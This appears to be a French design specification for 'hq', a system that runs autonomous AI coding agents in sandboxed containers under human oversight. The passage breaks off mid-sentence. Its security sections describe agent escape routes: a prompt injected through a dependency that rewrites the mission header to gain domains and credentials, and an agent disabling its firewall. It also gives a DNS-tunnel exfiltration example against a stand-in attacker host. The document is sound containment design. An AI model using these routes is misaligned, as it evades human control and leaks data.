# nunki — spécification

> **Statut : v2, 2026-09-09.** Construite en dialogue entre Arnaud et Claude
> les 8 et 9 septembre, puis passée par une revue indépendante (une session
> sans le contexte du dialogue ; son rapport est au HQ,
> `discussions/revue-spec-2026-09-09.md`). Cette version intègre la revue.
> Rien de ce fichier n'est implémenté.
>
> Chaque décision porte la mention **« Tranché par Arnaud »** et sa date. Deux
> revues indépendantes (rapports au HQ, `discussions/revue-spec-2026-09-09.md`
> et `-bis.md`) ont chacune été intégrées, leurs décisions passées une par une
> avec Arnaud, leurs corrections appliquées ; il ne reste rien à confirmer.
>
> Périmètre : **un orchestrateur de missions par IA, et rien d'autre.** Pas de
> génération de projet, pas de scaffolding.
>
> L'ordre des sections est celui de la décision : le but, qui fait quoi, les
> restrictions, et seulement ensuite le mécanisme. Un lecteur qui s'arrête à la
> section 3 doit pouvoir dire si le système fait ce qu'il faut ; la section 4 ne
> fait que dire comment. La section 7 dit ce que tout ça coûte.

## 1. Le but

`hq` fait travailler des agents de code **seuls, longtemps et en parallèle**
sur un dépôt, sous la supervision d'un poste de commandement (le HQ) tenu par
un humain et sa session d'assistant, sans que l'humain soit dans la boucle
d'exécution et sans qu'il cesse d'être le point de contrôle.

Il est **agnostique à la stack** : Rust, Python, TypeScript, Go ou autre ne
changent que des fragments déclarés (batterie, caches, domaines, fichiers
verrouillés), jamais le cœur.

Il est **agnostique au harnais** : Claude Code aujourd'hui, OpenCode, Codex ou
un autre demain. Le harnais est un exécutant interchangeable ; rien de ce qui
fait la méthode ne vit dans ses fichiers propres.

Ce qui est conservé de `claude-setup`, et qui justifie l'existence de ce
dépôt : le HQ comme lieu de décision ; une mission autoportante (cadre, journal,
livrable, canal de suivi) qui survit à la perte de contexte ; des portes de
vérification déterministes ; des slots isolés ; un seul geste humain non
délégable, la validation du push, et le merge ; et trois agents aux rôles
distincts — codeur, intégrateur, sécurité.

Ce qui est abandonné, et pourquoi : l'installeur qui copie des fichiers dans
le dépôt cible et passe ensuite sa vie à décider à qui ils appartiennent
(manifeste, checksums, `.new`, fusions dans les fichiers de réglages). Chaque
règle de propriété était un endroit où détruire du travail en silence.

**Ce que `hq` est, en un mot : un orchestrateur de missions par IA sur un
dépôt existant.** Tranché par Arnaud le 2026-09-08. Ce n'est **pas** un
générateur de projets : `hq` ne crée pas de dépôt, ne choisit pas de
structure, ne pose pas de squelette applicatif. Un dépôt vide qu'on veut
amorcer est un dépôt existant comme un autre, et l'amorçage est une mission
parmi d'autres, cadrée par un humain.

## 2. Qui fait quoi

Cinq rôles. Chacun a une seule source de vérité, et un rôle n'écrit jamais
dans celle d'un autre.

| rôle | où il tourne | ce qu'il fait | ce qu'il ne fait jamais | source de vérité |
|---|---|---|---|---|
| **l'humain** | sa machine | valide le cadre d'une mission, arbitre ce qui sort du cadre, **valide le push** une fois les trois rôles verts, merge sur la forge | exécuter | — |
| **le HQ** (superviseur) | une session d'assistant interactive, sur la machine de l'humain — ou, à son choix, dans le seul conteneur interactif du système, qui monte alors le socket du moteur : c'est accepté parce qu'aucun agent n'y tourne, et c'est la seule exception à 3.2 | cadre les missions, les surveille, lance leur vérification, tient le journal et le tableau de bord, rejoue les preuves dans le conteneur du slot (`hq exec`), **pousse la branche après la validation humaine** | coder dans une mission, pousser avant la validation, merger | son journal, `~/.hq/<projet>/` |
| **l'agent codeur** | le profil **mission** du slot : aucun service externe | exécute la mission par runs, commite ce qu'elle prescrit, tient le journal de mission et le livrable ; écrit les **tests unitaires et d'intégration** (plusieurs unités ensemble, dépendances bouchonnées ou composant local jetable) | pousser, poser une question bloquante, sortir du périmètre | `MISSION.md` pour le cadre, `JOURNAL.md` pour l'état |
| **l'agent intégrateur** | le profil **système** du même slot : pare-feu élargi aux services déclarés, identifiants de test montés, services levés par `hq` à côté de lui | **connecte le livrable aux infrastructures externes** — bases de données, API tierces, files de messages, services — joue migrations et fixtures, écrit et **lance les tests système** : bout en bout sur services réels, et tests de contrat contre les API tierces ; commite ce câblage et ces tests ; rend `INTEGRATED` ou `BROKEN` | pousser, toucher au code métier au-delà du câblage (défini en 4.4), lever lui-même un conteneur | `MISSION.md` d'intégration, `JOURNAL.md`, les runs système |
| **l'agent sécurité** | le profil **système** du même slot s'il y a des services, sinon le profil mission ; le code monté en lecture seule, un dossier de mission en écriture | attaque le livrable **intégré** : secrets exposés, entrées non validées, dépendances à avis, surface réseau, chemins protégés touchés, fuzz des entrées, et les points d'intégration que l'intégrateur vient d'ouvrir ; rend un rapport et un verdict `CLEAR` ou `FINDINGS` | corriger, commiter, pousser | le livrable intégré, la configuration, les dépendances |

Le codeur voit les services : non. L'intégrateur et la sécurité les voient :
oui, les mêmes, avec les mêmes identifiants de test. **Tranché par Arnaud le
2026-09-09** : la revue avait montré qu'une sécurité « sans service externe »
attaquerait une application qui ne démarre pas, et rendrait `CLEAR` sur un
binaire qui n'a rien fait. On ne pentest pas un système qui n'est pas
branché ; la sécurité hérite du profil système, et son fuzz d'API vise le
livrable qui tourne.

La relecture commit par commit, le périmètre et les preuves — ce que
`claude-setup` confiait à des relecteurs en lecture seule (`commit-reviewer`,
`evaluator`, `mission-closer`) — ne sont pas un rôle : ce sont des
**instruments du HQ**, tenus par les portes de vérification (4.4) et par des
relecteurs que le HQ lance à la demande, sans droits d'écriture.

Deux règles traversent le tableau.

- **Le rapport d'un agent n'est jamais la vérité, le livrable l'est.** Le HQ
  relit le code et rejoue les preuves ; un relecteur peut se tromper de
  scénario tout en ayant raison sur la structure.
- **Un agent ne corrige jamais son propre constat.** Il le rapporte tel quel.
  C'est le HQ qui décide de la suite, et sa suite est la boucle d'itération de
  4.5 — automatique et bornée. Les deux ne se contredisent pas : l'agent
  rapporte, le HQ itère.

**Qui appelle qui, et quand : la forme de la mission est déclarée au
cadrage.** Tranché par Arnaud le 2026-09-08 (l'ordre, et la sécurité
systématique) et précisé le 2026-09-09 (ce que « systématique » veut dire,
et quand un rôle ne s'applique pas). Le HQ enchaîne les rôles toujours dans
le même ordre, mais **une mission qui n'a pas de services n'appelle pas
l'intégrateur, et une mission sans surface exposée n'appelle pas l'agent
sécurité** : les forcer donnerait un `INTEGRATED` ou un `CLEAR` qui n'a rien
vérifié, le vert creux que ce projet refuse. La sécurité reste systématique
sous sa forme **mécanique** — audit des dépendances, scan de secrets, analyse
statique par stack — jouée comme portes du HQ sur chaque mission, sans agent.

L'en-tête de `MISSION.md`, validé par l'humain avant le lancement, déclare :

| champ | valeurs | ce qui en découle |
|---|---|---|
| `integration` | `none` (avec la raison en une ligne), ou la liste des services | avec `none`, pas de mission d'intégration ; sinon le profil système et l'intégrateur |
| `security` | `gates` ou `agent` | `gates` : les portes mécaniques seulement ; `agent` : en plus, la mission de sécurité — dans le profil système s'il y a des services, sinon dans le profil mission, sur le livrable seul |

`security: agent` s'impose dès que la mission a des services, une surface
exposée (HTTP, fichier importé, message reçu), de l'authentification, de la
cryptographie, ou un parseur d'entrée non fiable. `hq.yaml` nomme des
**chemins qui interdisent de sous-déclarer** : un commit sous `migrations/`,
`api/`, `auth/` — ce que le projet liste — rend rouge, à la porte de
périmètre, une mission déclarée `integration: none` ou `security: gates`,
avec le message qui dit pourquoi. Le HQ propose la forme, l'humain la valide,
la liste empêche la facilité.

Trois formes en pratique : **code seul** (codeur, portes dont la sécurité
mécanique) ; **code plus agent sécurité** (idem, puis la sécurité sur le
livrable, sans services) ; **code plus intégration plus sécurité** (le flux
complet). Le fuzz de bibliothèque et les invariants ne dépendent pas de la
forme : prescrits au cadrage, ils sont joués par le codeur sur toute fonction
qui prend une entrée, domaine pur compris — c'est là qu'ils rendent le plus.
Le flux complet et les règles d'itération sont en 4.5.

**L'intégrateur et la sécurité travaillent en missions**, comme le codeur :
un dossier, un `MISSION.md`, un journal, un verdict. L'intégrateur produit du
code (câblage, configuration, tests système) et commite, donc il a besoin de
tout ce qu'une mission donne — branche, runs, reprise à froid. La sécurité ne
commite pas mais laisse un rapport qui doit être rejouable, et un journal de
mission est la forme la plus simple de cette trace.

**L'intégrateur travaille sur la branche du codeur.** Tranché par Arnaud le
2026-09-08. La pull request porte le code et son intégration ensemble, et
c'est l'ensemble qui est relu, poussé et mergé.

**Deux niveaux de test, deux profils.** Tranché par Arnaud le 2026-09-08, avec
les mots de l'échelle classique pour qu'un agent les comprenne du premier coup.

| niveau | ce qu'il vérifie | l'extérieur | qui | où |
|---|---|---|---|---|
| **unitaire + intégration** | une unité seule ; plusieurs unités ensemble (service et dépôt de données, handler et routeur) | bouchonné, ou un composant local jetable — un **processus dans l'image** (SQLite, un PostgreSQL embarqué, un Redis local), déclaré par le Dockerfile de stack, jamais un conteneur levé par le test | le codeur | le profil mission, sans réseau vers les services |
| **système** (bout en bout, et contrat contre les API tierces) | l'application assemblée, branchée sur ses **vraies** dépendances | réel, dans un environnement de test | l'intégrateur | le profil système, avec la liste blanche et les identifiants de test que la mission déclare |

Un test qui bouchonne l'extérieur est un test d'intégration, quel que soit
son nom, et il est au codeur. Un mock dans un test système n'est admis que
quand le service réel est inaccessible, et le journal dit lequel et pourquoi.

**Où vivent les services externes** du profil système : trois cas, déclarés
dans le bloc structuré du `MISSION.md` d'intégration (4.1), et c'est la
déclaration qui décide de la liste blanche réseau et des identifiants montés.
**Seul `hq` lève des conteneurs**, depuis l'hôte ; l'intégrateur rejoint ce
qui est là. La revue a montré que « lancés par lui » imposait le socket
Docker dans le conteneur, c'est-à-dire root sur la machine.

| les services sont | l'intégrateur | réseau | identifiants |
|---|---|---|---|
| **en Docker**, levés par `hq` à côté de l'agent (le fichier de services du projet), ou par l'humain sur un réseau nommé | les rejoint, joue migrations et fixtures | le réseau nommé du profil, rien d'autre | ceux du fichier de services, jetables |
| **en Kubernetes** | les atteint par un accès dédié au cluster de test | les adresses du cluster déclarées | un compte de service de test, portée minimale |
| **hors de la machine** — une vraie API, un vrai fournisseur | les appelle pour de vrai | les domaines déclarés, un par un | un identifiant de **palier de test** du fournisseur ; s'il n'en a pas, c'est un arbitrage humain écrit dans `MISSION.md`, et 3.2 dit ce que ça expose |
| **inaccessibles** | pose un mock, le nomme au journal avec la raison | — | — |

**Fuzz, invariants, mutants : trois rôles, pas quatre.** Tranché par Arnaud
le 2026-09-08. Trois techniques, trois natures, chacune chez celui qui a déjà
le bon point de vue et la bonne indépendance : le HQ juge les tests du codeur
sans les avoir écrits, la sécurité attaque un code qu'elle n'a pas écrit, le
codeur prouve des propriétés qu'il n'a pas choisies.

- Les **invariants** (tests par propriétés) décrivent le contrat du code ; ils
  s'écrivent avec lui. Ils sont au **codeur**, prescrits comme preuves dans
  `MISSION.md` (« une preuve incapable d'échouer ne prouve rien »).
- Le **fuzzing** a deux formes dans la pratique, et elles ne vont pas au même
  rôle. Le fuzz **de bibliothèque** (cargo-fuzz, libFuzzer, le fuzz natif de
  Go) vise des fonctions isolées — parseurs, décodeurs — et se joue sans
  service, en campagne courte : il est au **codeur**, dans son commit stage.
  Le fuzz **d'API ou de protocole** vise un système qui tourne ; c'est un outil
  de pentest, il est à l'agent **sécurité**, sur le livrable intégré — et
  **jamais contre un fournisseur tiers réel**, dont les conditions
  d'utilisation l'interdisent en général : le fuzz vise le livrable, pas ce
  qu'il appelle.
- La **mutation** ne teste pas le code, elle teste les **tests**. C'est une
  **porte du HQ** (4.4, porte 7), jouée sur les fichiers touchés avant de
  lancer l'intégrateur ; un mutant survivant revient au codeur avec ses trois
  issues possibles (tué par un test nommé, démontré équivalent en une phrase,
  reconnu comme bug et figé dans un test rouge). Le HQ décide et lit ; la
  campagne **s'exécute dans le conteneur du slot**, où sont la toolchain, le
  cache et l'isolation — jamais sur la machine de l'humain, qui n'a pas à
  savoir compiler la stack.

Ce qui vaut pour la mutation vaut pour le fuzz : l'agent qui a le bon point de
vue décide, la charge tourne dans un conteneur autonome.

**Le pipeline, dans l'ordre, inspiré des cadres écrits — et là où il s'en
écarte.** Tranché par Arnaud le 2026-09-09 ; les attributions ont été
vérifiées sur les textes intégraux par la seconde revue, et corrigées. Les
niveaux de test sont ceux d'ISTQB v4 et d'ISO/IEC/IEEE 29119, fusionnés deux
par deux (composant et intégration de composants ; intégration de systèmes
et système), et le mot « acceptation » du tableau est celui de Humble et
Farley, pas le niveau ISTQB du même nom, qui est humain. L'ordre des étapes
est celui du pipeline de livraison continue de Humble et Farley — commit
stage, acceptation automatisée, release — avec **un écart assumé** : leur
étape d'acceptation bouchonne les systèmes tiers, et `hq` y branche les
services réels et les API tierces, parce que c'est ce que l'intégrateur est
fait pour vérifier. La place de la sécurité mécanique au commit stage suit
NIST SSDF (PW.8) et OWASP SAMM, qui demandent des tests de sécurité
automatisés tout au long du pipeline ; l'agent sécurité sur le livrable
intégré est un choix de `hq`, que ces cadres n'imposent pas. La mutation à la
revue, sur les lignes changées, vient de Google (Petrović et Ivanković,
2018), **mais Google n'en fait ni une porte ni un score** : les survivants y
sont des constats présentés au relecteur, et c'est cette forme que la porte
7 reprend, sans seuil.

| étape | qui | contenu | pourquoi là |
|---|---|---|---|
| **commit stage** | le codeur | code ; tests unitaires et d'intégration étroite ; tests par propriétés prescrits ; lint ; analyse statique et audit de dépendances par stack ; fuzz de bibliothèque en campagne courte | tout ce qui tourne sans service, en minutes |
| **mutation** sur les fichiers touchés | porte du HQ | campagne dans le conteneur du slot, chaque survivant trié par le codeur | ne dépend que du code et des tests unitaires ; jouée plus tard, elle renverrait au codeur après avoir payé l'intégration et la sécurité pour rien |
| **acceptation** | l'intégrateur | tests système de bout en bout sur services réels ; tests de contrat contre les API tierces ; cas d'erreur d'intégration écrits à la main (connexion refusée, 500, délai) | l'étape d'acceptation automatisée, sur un environnement proche de la production |
| **sécurité dynamique** | la sécurité | analyse dynamique, fuzz d'API, pentest, sur le livrable intégré | les cadres la placent toujours sur un système déployé |
| **release** | l'humain | validation, push, merge | le seul geste non délégable |

Chaque étape ne se lance que si la précédente est verte, et plus on avance,
plus c'est lent et cher — c'est la raison de l'ordre, pas une préférence.

**Ce que l'intégrateur écrit, et pourquoi il commite.** Tranché par Arnaud le
2026-09-09. Dans l'étape d'acceptation, quelqu'un doit écrire les tests
système, et le codeur ne le peut pas sérieusement : il n'a pas les services
pour les faire tourner, il les écrirait à l'aveugle. L'intégrateur écrit donc
les tests de bout en bout et de contrat, la configuration qui pointe vers
les services de test, les jeux de données et fixtures, l'ordre de jeu des
migrations — c'est ce que la spec appelle le **câblage**, et la porte 4 en
tient la liste. Il commite parce que ces fichiers font partie du livrable :
sans eux dans la branche, la CI ne rejoue pas les tests système et la pull
request ne porte que la moitié du travail.

Le quatrième rôle reste une option, avec un critère mesurable pour l'ouvrir :
si la sécurité ou l'intégrateur trouvent régulièrement des défauts que des
tests unitaires auraient dû attraper, ou si le taux de mutants survivants
reste haut malgré la porte, c'est le signal qu'il faut un adversaire dédié.
Sans ce signal, la répartition suffit.

## 3. Les restrictions

Elles sont ce qui rend l'autonomie acceptable. Elles se lisent comme des
invariants : si l'un tombe, le système n'est plus sûr, quel que soit le reste.

### 3.1 Ce qu'un agent ne peut jamais faire

1. **Pousser.** Le push n'a lieu qu'après validation humaine, et le merge est
   humain. Tout le reste peut être autonome parce que ceux-là ne le sont pas.
2. **Écrire sur une branche protégée.** `main`, `dev`, et ce que le dépôt
   déclare.
3. **Lire ou écrire un secret de production.** Fichiers d'environnement,
   clés, certificats : aucun n'est présent dans un conteneur d'agent. Ce
   qu'un agent voit, ce sont des **identifiants de test**, et 3.2 dit
   honnêtement ce que ça vaut.
4. **Éditer un chemin protégé** déclaré par le projet : CI, fichiers vendorés,
   témoins de test, fichiers déjà présents sur la base sous un dossier de
   migrations. Créer un fichier neuf dans ces zones peut rester libre
   (« réécrire est l'accident, créer est le travail »).
5. **Atteindre le dépôt principal.** Un agent ne travaille que dans son slot ;
   ses commits n'en sortent que quand le HQ vient les chercher.
6. **Sortir du réseau autorisé.** Liste blanche par rôle, par stack et par
   mission, **vide par défaut**, tout le reste refusé et journalisé.
7. **Poser une question bloquante.** Une décision imprévue se prend dans le
   sens le plus conservateur, se consigne comme `ARBITRAGE-PROVISOIRE`, et se
   présente dans le journal à la fin du run.

### 3.2 Comment ces restrictions sont tenues — la règle d'agnosticité

**Une restriction ne repose jamais sur le harnais.** Les trois harnais visés
ont aujourd'hui un mécanisme de garde — hooks pour Claude Code, hooks pour
Codex depuis sa version 0.117, plugins pour OpenCode — mais aucun n'a la
même forme, aucun n'est garanti sur le suivant, et un harnais que `hq`
n'a pas encore rencontré n'en a peut-être pas. Ce qui fait respecter la
section 3.1 doit exister quel que soit l'exécutant :

| restriction | tenue par | ce que ça ne tient pas, dit honnêtement |
|---|---|---|
| pousser, atteindre le dépôt principal | le slot : un clone dont l'`origin` est un chemin hôte inexistant dans le conteneur, cloné **sans liens durs** (`--no-hardlinks`, tranché par Arnaud le 2026-09-09 : la revue a montré qu'un clone local à liens durs partage ses objets `.git` avec le dépôt principal, et qu'une écriture brute dans le conteneur les corrompt) ; **aucun credential de forge** dans un conteneur, et **aucun domaine de forge** dans la liste blanche du codeur | un identifiant de forge qui arriverait par une autre voie — un fichier oublié dans le dépôt, une API tierce à intégrer qui *est* une forge — donne à l'agent le droit de pousser n'importe où : ces cas sont un arbitrage humain écrit, jamais un défaut |
| branche protégée | la forge (branches protégées) et la CI ; la porte 2 à chaque run ; la session HQ ne pousse que ce que les portes ont vu | localement, rien n'empêche un agent de commiter sur `main` dans son clone ; la porte 2 le voit, et la forge refuse le push. `hq check` **vérifie la protection côté forge** par son API quand un credential de forge est présent sur l'hôte, et dit qu'il ne l'a pas vérifiée sinon |
| secrets | rien n'est monté dans un profil mission ; dans un profil système, seuls des fichiers d'identifiants **nommés par la mission** et **rangés dans un dossier réservé aux identifiants de test** (4.1) sont montables, en lecture seule ; un utilisateur sans droits dans le conteneur | **l'agent lit ce que l'application lit** : même utilisateur, même processus. Un identifiant de test monté est visible de l'agent, et le jeton du harnais est dans son environnement. C'est assumé (tranché par Arnaud le 2026-09-09) : la garantie ne porte pas sur « l'agent ne lit pas », qu'aucun mécanisme agnostique ne tient, mais sur « rien de production n'entre dans un conteneur », que le dossier réservé rend mécanique ; un hook de harnais peut refuser la lecture plus tôt, en confort |
| chemins protégés | la porte de périmètre, **par commit et à la fin de chaque run** (4.4), sur le diff base..HEAD ; la relecture du HQ | entre deux runs, un commit interdit existe déjà dans le clone ; il est refusé au run suivant, pas à l'écriture. Un hook de harnais peut refuser plus tôt (confort, 4.3) |
| réseau | le **pare-feu du conteneur** (4.1 bis) : un **sidecar** qui possède l'espace réseau et détient seul les capacités, l'agent qui le rejoint sans aucune ; règles non posées = agent qui ne démarre pas ; le port 53 détourné vers un résolveur **filtrant** qui ne relaie jamais ; aucune plage privée ouverte ; liste blanche par rôle | rien ici ne protège du contenu qu'un domaine autorisé sert. Les adresses suivent les réponses DNS, donc un CDN qui bouge reste joignable ; `hq check` sonde de l'intérieur |
| question bloquante | le mode sans interface (4.3) : ce qui aurait demandé est refusé ; le contrat de run et le journal | — |

Un hook, un plugin ou un réglage de harnais peut **doubler** une de ces lignes
pour refuser plus tôt et plus lisiblement. C'est un confort par harnais,
livré comme un adaptateur, jamais la garde.

Corollaire, hérité et vérifié : **en autonome, refuser est sûr et demander est
dangereux.** Un refus est lu par l'agent comme une erreur d'outil et il
enchaîne ; une question attend quelqu'un qui n'est pas là.

### 3.3 Ce que `hq` ne fait jamais dans un dépôt

1. Il n'écrit pas dans les fichiers de réglages d'un harnais (`settings.json`
   et consorts). Il les lit s'il le faut. Ce qu'un adaptateur doit passer au
   harnais, il le passe **à l'invocation** (Claude Code accepte ses réglages
   en argument de `-p`), jamais en écrivant dans le slot.
2. Il ne supprime jamais un fichier qu'il n'a pas créé — et un slot, qu'il a
   créé, n'est pas supprimé ni remis à zéro tant qu'il porte des commits non
   rapatriés : `hq slot rm` et `reset` refusent, et nomment la branche.
3. Il n'écrase jamais un fichier qu'un humain est censé éditer. S'il a une
   version nouvelle à proposer, il la dépose à côté.
4. Il ne décide pas du `.gitignore` du projet. Il peut poser un
   `.gitattributes` **absent** pour forcer LF (4.2 bis), et le dépose à côté
   s'il en existe un.
5. Il ne commite jamais, et ne pousse que par `hq push`, sur l'ordre
   explicite de l'humain.

### 3.4 Ce qui ne doit pas entrer dans le commun

Pour que le socle reste commun à des gens qui travaillent différemment :
pas de commit automatique, pas de rituel de session obligatoire, pas de porte
propre à un type de projet, et pas d'écriture hors des quatre lieux qui sont
au système — le dépôt cible, le HQ (`~/.hq/<projet>/`), les slots à côté
du dépôt, et les volumes nommés du moteur de conteneurs.

## 4. Le mécanisme

Tout ce qui précède se tient avec trois couches. Chacune a une frontière
nette, et seule la troisième connaît le harnais.

### 4.1 Le socle portable — des fichiers

Ce que tout harnais lit ou que `hq` lit lui-même. Du Markdown, du shell, du
YAML, du JSON, du git. Rien d'autre.

| élément | forme | lu par |
|---|---|---|
| les règles du lieu | `AGENTS.md` à la racine (et par zone) ; `CLAUDE.md` n'est qu'un import (`@AGENTS.md`) ou un lien vers lui, les deux documentés par Claude Code. Un `CLAUDE.md` existant n'est pas écrasé (3.3) : `hq init` dépose l'import à côté, le résumé le dit, et **`hq check` est rouge** tant que ce `CLAUDE.md` n'importe pas `AGENTS.md` — sinon les règles ne seraient jamais lues par ce harnais et `mission start` partirait sans elles. L'adaptateur peut, en attendant, passer `AGENTS.md` par `--append-system-prompt-file` | tous les harnais qui le supportent, Claude Code via import ou lien |
| les compétences | `SKILL.md`, standard ouvert (agentskills.io) adopté par OpenCode, Codex, Gemini CLI, Cursor, Copilot et d'autres — vérifié le 2026-09-09 ; il peut porter des choses essentielles | les harnais |
| la mission | un dossier **au HQ, hors de l'arbre git** (voir les montages) : `MISSION.md` et `FOLLOWUP_HQ.md` (à l'humain et au HQ, lecture seule pour l'agent), `JOURNAL.md`, `PR.md`, `VERDICT.json` (à l'agent) — la même forme pour les trois rôles | l'agent qui la porte, le HQ |
| le bloc structuré de `MISSION.md` | un en-tête YAML que `hq` lit, valide et **fige dans son état à la validation humaine** : forme (`integration`, `security`), rôle, branche, base, **la liste des lots** (un identifiant et un titre chacun — c'est elle qui donne « un run par lot » et qui fait refuser un `VERDICT.json` écrit avant que le dernier lot ait son entrée « fini » dans le journal), borne de volets, tentatives par lot, délais, script de lancement, et pour une mission d'intégration les **services** (réseau nommé, adresses, domaines) et les **fichiers d'identifiants** montés. La prose du gabarit vient après, pour l'agent. L'agent ne peut pas l'écrire, et `hq` ne le relit pas en cours de mission | `hq`, puis l'agent |
| le verdict | `VERDICT.json` dans le dossier de mission : `{ role, verdict, head, date, report }`, écrit par l'agent à la fin de son dernier run ; `hq` le refuse si `head` n'est pas le `HEAD` réel de la branche | `hq` |
| le contrat de run | un run par lot (4.3) : ce qu'un run doit avoir produit avant de sortir — le lot commité et prouvé ou l'échec dit, arbre commitable, bloc `ÉTAT DE REPRISE` en tête du journal (écrit aussi toutes les 45 minutes en cours de run), et pour le dernier lot le verdict | l'agent, par `MISSION.md` ; `hq`, à la sortie et aux checkpoints |
| les chemins protégés | une liste déclarative par projet, **deux modes** : refuser, refuser seulement si le fichier existe déjà sur la base. Le mode « demander » a disparu : rien ne peut demander en autonome | la porte de périmètre, et l'adaptateur harnais s'il double |
| la batterie | un script par projet, cousu depuis un fragment par stack | la porte « batterie », la CI |
| la configuration du projet | `hq.yaml` à la racine du dépôt : harnais, stacks, branches protégées, chemins protégés, liste blanche par stack, borne de volets, seuil de mutants, délais, dossier des identifiants de test. `MISSION.md` prime sur lui pour ce qu'il redéclare | `hq` |
| le conteneur | un **Dockerfile** par stack (les anciennes « features » deviennent des étapes, l'image pré-crée les points de montage avec l'uid de l'hôte) et un fichier **Compose par profil, généré par `hq`** à chaque lancement — voir 4.2. **Tous les conteneurs d'agent sont autonomes** : derrière un pare-feu en liste blanche, sans supervision humaine dedans, arrêtables par `hq`. Deux variantes d'un même profil autonome — **mission** (codeur : aucun service externe) et **système** (intégrateur et sécurité : pare-feu élargi aux services déclarés, identifiants de test montés, services à côté). Un profil **interactif** n'existe que pour un seul usage possible : héberger le **HQ** lui-même si l'humain choisit de le faire tourner en conteneur plutôt que sur sa machine ; un `devcontainer.json` de quelques lignes est la **vue IDE** de ce profil, et rien de plus. Aucun agent ne tourne jamais en interactif | le moteur de conteneurs, par sa commande Compose |
| le HQ du projet | `~/.hq/<projet>/` : journal, tableau de bord, file de remontées, discussions, **et l'état de `hq`** (4.2) | le superviseur, `hq` |

**Les montages, par profil.** La revue a montré que « où vit le dossier de
mission » décidait de tout le reste : l'agent y écrit son journal pendant que
le HQ y écrit le suivi, la sécurité doit y écrire alors que le code est en
lecture seule, et la porte « arbre propre » ne doit pas le voir.

| profil | l'arbre du slot | le dossier de mission | identifiants | services |
|---|---|---|---|---|
| mission (codeur) | lecture-écriture | **hors de l'arbre**, au HQ : `~/.hq/<projet>/missions/<id>/`, monté dans le conteneur — **trois fichiers en écriture** (`JOURNAL.md`, `PR.md`, `VERDICT.json`), le reste en lecture seule | aucun | aucun |
| système (intégrateur) | lecture-écriture | idem | les fichiers nommés par la mission, en lecture seule, depuis le dossier réservé | ceux de la mission, à côté |
| système (sécurité) | **lecture seule**, plus les répertoires d'écriture déclarés par la stack en volumes | idem | idem | idem, jamais arrêtés depuis le profil précédent |
| interactif (HQ) | lecture-écriture | tout `~/.hq/<projet>/` | ce que l'humain décide | ce que l'humain décide |

**Le dossier de mission vit au HQ, pas dans le slot.** Tranché par Arnaud le
2026-09-09. `claude-setup` le rangeait dans le slot, sous `.<prenom>/missions/`,
protégé de git par une exclusion locale ; ici il est sous
`~/.hq/<projet>/missions/<id>/` et monté dans le conteneur. C'est un
déplacement, pas un changement de nature : le dossier reste partagé entre
l'hôte et le conteneur par un montage, et c'est ce partage qui fait que le HQ
et l'agent communiquent par fichiers, sans canal. Ce qu'on y gagne : le
journal partagé sans le commiter, l'arbre propre sans exclusion à maintenir,
et un dossier qui survit à `hq slot rm`.

**Ce que l'agent peut y écrire, et rien d'autre.** Tranché par Arnaud le
2026-09-09, après que la seconde revue a montré le trou que la v1 avait
ouvert : le dossier était entièrement en écriture, `MISSION.md` compris, et
son en-tête — liste blanche, identifiants, borne — était relu par `hq` à
chaque run. Un agent, ou un prompt injecté par une dépendance qu'il lit,
pouvait s'écrire un domaine et un fichier d'identifiants de plus au run 1 et
les obtenir au run 2. Donc :

1. L'agent n'écrit que dans **`JOURNAL.md`, `PR.md` et `VERDICT.json`**.
   `MISSION.md` et `FOLLOWUP_HQ.md` lui sont montés en **lecture seule** : ils
   sont à l'humain et au HQ.
2. `hq` **ne relit jamais l'en-tête** du dossier pendant la mission. Il le
   **fige dans son état** (`~/.hq/<projet>/state/`) au moment où l'humain
   valide le cadrage, et c'est cette copie figée qui génère chaque Compose et
   chaque liste blanche.
3. Changer la forme d'une mission en cours est un geste du HQ, par un verbe
   (`hq mission reframe`), qui remet le cadrage devant l'humain et refige
   l'en-tête ; jamais une édition du fichier.

### 4.1 bis — Le pare-feu

La première revue a lu le pare-feu hérité de `claude-setup` et l'a trouvé
troué sur quatre points : lancé par `sudo` par un utilisateur qui l'avait,
donc désactivable par l'agent ; un échec au démarrage laissait le conteneur
sans règles, en silence ; le port 53 était ouvert vers toute adresse ; toutes
les plages privées étaient ouvertes, donc le conteneur « sans services » du
codeur atteignait chaque service de la machine. La seconde revue a trouvé
deux failles dans la première correction : le résolveur embarqué de Docker
**relaie toute requête DNS** vers l'amont, donc « ouvrir le port 53 vers le
résolveur du moteur » laissait le tunnel DNS ouvert (`dig
<données>.attaquant.example`) ; et re-résoudre les domaines pendant une
campagne exige de garder une capacité que la règle « rendue après le
démarrage » avait rendue. **Tranché par Arnaud le 2026-09-09** :

1. **Le garde est un conteneur à part.** Chaque conteneur d'agent est
   accompagné d'un **sidecar pare-feu**, minuscule, qui **possède l'espace
   réseau** que l'agent rejoint (le sens est vérifié par exécution, voir
   4.2). Lui seul détient des capacités — `NET_ADMIN` et `NET_RAW` pour
   poser les règles, `SETUID` et `SETGID` parce que son résolveur descend
   sur son propre uid, et que c'est cet uid qui distingue ses requêtes de
   celles de l'agent (mesuré : sans elles, « failed to change group-id to
   dip: Operation not permitted ») ; c'est lui, et non l'agent, qui
   s'attache aux réseaux des services du projet. L'agent tourne **sans
   aucune capacité** (`cap_drop: [ALL]`, `no-new-privileges`), directement
   sous l'uid de l'hôte (`user:` dans le Compose généré, ce que le sidecar
   rend possible : plus d'entrypoint root à abandonner), sans `sudo`, sans
   binaire setuid dans son image : il n'y a rien à défaire chez lui, et une
   évasion de son processus ne trouve aucun pouvoir à côté.
2. **Un sidecar qui échoue est un agent qui ne démarre pas.** Le conteneur
   d'agent dépend du sidecar en bonne santé ; si les règles ne se posent
   pas, rien ne se lance. Jamais un agent sans règles.
3. **Le sidecar est le seul résolveur DNS** du conteneur, et il est
   **filtrant** : il ne répond que pour les domaines de la liste blanche et
   rend NXDOMAIN pour tout le reste, sans jamais relayer. Il ne suffit pas
   de l'écrire dans `/etc/resolv.conf` — le moteur y met le sien, et
   l'agent pourrait interroger un autre serveur : le sidecar **détourne
   tout le port 53** de l'espace réseau partagé vers lui-même, et refuse le
   reste. C'est ce détournement que la sonde de `hq check` mesure. Le tunnel DNS est
   fermé par construction, dans tous les profils.
4. **Les adresses autorisées suivent les réponses DNS.** Le sidecar, qui
   répond lui-même aux questions d'adresse, ajoute au fil de l'eau les
   adresses résolues pour un domaine autorisé (un ensemble d'adresses que
   les règles consultent). Un domaine derrière un CDN qui change d'adresse
   en cours de campagne reste joignable, sans re-résolution périodique et
   sans qu'aucun pouvoir ne vive dans le conteneur de l'agent.
5. **Aucune plage privée n'est ouverte** par défaut. Un service de l'hôte ou
